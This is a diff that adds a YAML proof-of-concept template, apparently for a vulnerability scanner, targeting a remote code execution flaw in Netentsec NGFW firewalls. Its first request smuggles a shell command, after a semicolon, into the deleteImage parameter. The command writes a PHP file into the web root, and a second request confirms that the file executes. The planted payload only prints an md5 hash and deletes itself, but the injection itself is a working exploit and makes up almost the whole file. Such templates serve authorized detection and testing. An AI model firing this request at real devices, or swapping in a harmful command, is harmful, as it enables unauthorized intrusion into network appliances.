@@ -1,0 +1,33 @@
+id: poc-yaml-netentsec-ngfw-rce
+info:
+  name: Netentsec Ngfw 远程代码执行漏洞
+  severity: medium
+  tags:
+  - rce
+  finger: Netentsec Ngfw
+  reference: []
+  description: null
+variables:
+  r2: random_str(10)
+transport: http
+requests:
+- method: POST
+  path: /directdata/direct/router
+  headers: {}
+  data: '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo
+    ''<?php echo md5({{.r2}});unlink(__FILE__);?>'' >/var/www/html/{{.r2}}.php"]}],"type":"rpc","tid":17}'
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "SSLVPN_Resource") && contains(body,
+    "\"result\":{\"success\":true}")
+  output: []
+- method: GET
+  path: /{{.r2}}.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, md5(r2))
+  output: []
